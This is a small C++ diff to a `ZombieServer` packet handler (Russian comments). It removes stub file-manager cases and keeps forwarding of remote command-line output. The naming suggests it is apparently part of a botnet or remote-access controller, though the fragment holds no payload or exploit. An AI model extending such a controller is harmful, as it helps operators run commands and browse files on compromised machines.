@@ -303,7 +303,7 @@ void ZombieServer::WorkData(Packet* pak)
 {
 	User user; // Переменная для хранения информации о подключенном клиенте
 
-			   // Реагируем на полученное сообщение в соответствии с типом пакета
+	// Реагируем на полученное сообщение в соответствии с типом пакета
 	switch (pak->type)
 	{
 	case PACKET_USER_JOINED:
@@ -317,17 +317,6 @@ void ZombieServer::WorkData(Packet* pak)
 
 		// Отправляем данные из командной строки
 		SendMessage(hWnd, WM_CMD_REPORT, (WPARAM)pak->data, PACKET_DATA_SIZE);
-		return;
-
-	case PACKET_FILE_MANAGER_DRIVE:
-
-		// Нужно переделать. Это как пример.
-		SendMessage(hWnd, WM_DRIVE, (WPARAM)pak->data, PACKET_DATA_SIZE);
-		return;
-
-	case PACKET_FILE_MANAGER_FILE:
-
-
 		return;
 	}
 }
